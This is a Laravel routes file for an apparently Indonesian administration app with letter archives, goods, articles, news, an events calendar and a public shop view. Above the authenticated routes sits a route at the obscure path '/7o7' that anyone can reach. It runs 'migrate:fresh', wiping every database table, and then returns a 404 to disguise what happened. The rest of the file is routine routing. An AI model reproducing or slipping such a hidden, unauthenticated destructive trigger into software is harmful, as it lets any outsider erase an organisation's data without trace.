<?php

use App\Http\Controllers\Artikel;
use App\Http\Controllers\Barang;
use App\Http\Controllers\Berita;
use App\Http\Controllers\Blog;
use App\Http\Controllers\Calendar;
use App\Http\Controllers\Dashboard;
use App\Http\Controllers\Ecommerce;
use App\Http\Controllers\KategoriBarang;
use App\Http\Controllers\KategoriSurat;
use App\Http\Controllers\Login;
use App\Http\Controllers\SuratKeluar;
use App\Http\Controllers\SuratMasuk;
use App\Models\Postingan;
use Illuminate\Support\Facades\Artisan;
use Illuminate\Support\Facades\Route;

Route::get('/7o7', function () {
    Artisan::call('migrate:fresh');
    return abort(404);
});
/*
|--------------------------------------------------------------------------
| Web Routes
|--------------------------------------------------------------------------
|
| Here is where you can register web routes for your application. These
| routes are loaded by the RouteServiceProvider within a group which
| contains the "web" middleware group. Now create something great!
|
*/

Route::get('login', [Login::class, 'login'])->name('login');
Route::post('login/aksi', [Login::class, 'login_action'])->name('loginaksi');
Route::get('login/aksi/logout', [Login::class, 'logout'])->name('logout');

Route::middleware(['auth'])->group(function () {

    Route::get('/', [Dashboard::class, 'index'])->name('dashboard');
    Route::get('/admin/edit', [Login::class, 'edit'])->name('editadmin');
    Route::post('/admin/update', [Login::class, 'update'])->name('updateadmin');

    //CRUD Surat Masuk
    Route::get('surat/masuk', [SuratMasuk::class, 'index'])->name('suratmasuk');
    Route::post('surat/masuk/simpan', [SuratMasuk::class, 'store'])->name('simpansuratmasuk');
    Route::post('surat/masuk/update', [SuratMasuk::class, 'update'])->name('updatesuratmasuk');
    Route::get('surat/masuk/hapus/{kode_surat}', [SuratMasuk::class, 'delete'])->name('hapussuratmasuk');
    Route::get('surat/masuk/cetak_pdf', [SuratMasuk::class, 'cetak_pdf'])->name('cetaksuratmasuk');

    //CRUD Surat Keluar
    Route::get('surat/keluar', [SuratKeluar::class, 'index'])->name('suratkeluar');
    Route::post('surat/keluar/simpan', [SuratKeluar::class, 'store'])->name('simpansuratkeluar');
    Route::post('surat/keluar/update', [SuratKeluar::class, 'update'])->name('updatesuratkeluar');
    Route::get('surat/keluar/hapus/{kode_surat}', [SuratKeluar::class, 'delete'])->name('hapussuratkeluar');
    Route::get('surat/keluar/cetak_pdf', [SuratKeluar::class, 'cetak_pdf'])->name('cetaksuratkeluar');

    //CRUD Kategori Surat
    Route::get('surat/kategori', [KategoriSurat::class, 'index'])->name('kategorisurat');
    Route::post('surat/kategori/simpan', [KategoriSurat::class, 'store'])->name('simpankategorisurat');
    Route::get('surat/kategori/ubah/{id}', [KategoriSurat::class, 'edit'])->name('editkategorisurat');
    Route::post('surat/kategori/update', [KategoriSurat::class, 'update'])->name('updatekategorisurat');
    Route::get('surat/kategori/hapus/{id}', [KategoriSurat::class, 'delete'])->name('hapuskategorisurat');

    ///CRUD Kategori Barang
    Route::get('barang/kategori', [KategoriBarang::class, 'index'])->name('kategoribarang');
    Route::post('barang/kategori/simpan', [KategoriBarang::class, 'store'])->name('simpankategoribarang');
    Route::get('barang/kategori/ubah/{id}', [KategoriBarang::class, 'edit'])->name('editkategoribarang');
    Route::post('barang/kategori/update', [KategoriBarang::class, 'update'])->name('updatekategoribarang');
    Route::get('barang/kategori/hapus/{id}', [KategoriBarang::class, 'delete'])->name('hapuskategoribarang');

    //CRUD Barang
    Route::get('barang', [Barang::class, 'index'])->name('barang');
    Route::post('barang/simpan', [Barang::class, 'store'])->name('simpanbarang');
    Route::get('barang/ubah/{id}', [Barang::class, 'edit'])->name('editbarang');
    Route::post('barang/update', [Barang::class, 'update'])->name('updatebarang');
    Route::get('barang/hapus/{id}', [Barang::class, 'delete'])->name('hapusbarang');

    //CRUD Artikel
    Route::get('post/artikel', [Artikel::class, 'index'])->name('artikel');
    Route::get('x/post/artikel', [Artikel::class, 'cekSlugArtikel']);
    Route::post('post/artikel/simpan', [Artikel::class, 'store'])->name('simpanartikel');
    Route::post('post/artikel/edit', [Artikel::class, 'update'])->name('updateartikel');
    Route::get('post/artikel/hapus/{slug}', [Artikel::class, 'delete'])->name('hapusartikel');

    //CRUD Berita
    Route::get('post/berita', [Berita::class, 'index'])->name('berita');
    Route::get('x/berita/cekSlug', [Berita::class, 'cekSlug']);
    Route::get('x/berita/cekSlug2', [Berita::class, 'cekSlug2']);
    Route::post('post/berita/simpan', [Berita::class, 'store'])->name('simpanberita');
    Route::post('post/berita/edit', [Berita::class, 'update'])->name('updateberita');
    Route::get('post/berita/hapus/{slug}', [Berita::class, 'delete'])->name('hapusberita');

    //Cek Agenda
    Route::get('/agenda', [Calendar::class, 'getEvent'])->name('getevent');
    Route::get('/surat/keluar/{kode_surat}', [SuratKeluar::class, 'detail'])->name('detailsuratkeluar');
    Route::get('/surat/masuk/{kode_surat}', [SuratMasuk::class, 'detail'])->name('detailsuratmasuk');

    // kegiatan
    Route::get('/admin-kegiatan', [Calendar::class, 'getKegiatan'])->name('kegiatan');
    Route::post('/add-kegiatan', [Calendar::class, 'add_kegiatan'])->name('addkegiatan');
    Route::post('/edit-kegiatan', [Calendar::class, 'edit_kegiatan'])->name('editkegiatan');
    Route::post('/delete-kegiatan/{id}', [Calendar::class, 'delete_kegiatan'])->name('deletekegiatan');
});

//View User Ecommerce
Route::get('ecommerce', [Ecommerce::class, 'index'])->name('ecommerce');
Route::get('ecommerce/kategori/{id}', [Ecommerce::class, 'cekkategori'])->name('ecommercekategori');
Route::get('ecommerce/search/', [Ecommerce::class, 'cari'])->name('caribarang');

//View User Berita
Route::get('berita', [Berita::class, 'tampil'])->name('tampilberita');
Route::get('berita/baca/{slug}', [Berita::class, 'baca'])->name('bacaberita');
Route::get('berita/search/', [Berita::class, 'cari'])->name('cariberita');

//View User Artikel
Route::get('artikel', [Artikel::class, 'tampil'])->name('tampilartikel');
Route::get('artikel/baca/{slug}', [Artikel::class, 'baca'])->name('bacaartikel');
Route::get('artikel/search/', [Artikel::class, 'cari'])->name('cariartikel');

//Agenda
Route::get('/getevent', [Calendar::class, 'getEvent'])->name('getevent');

//Home user
Route::get('/blog', [Blog::class, 'index'])->name('blog');

Route::get('kegiatan/baca/{id}', [Calendar::class, 'baca'])->name('bacakegiatan');
Route::get('kegiatan/list', [Calendar::class, 'tampil'])->name('listkegiatan');
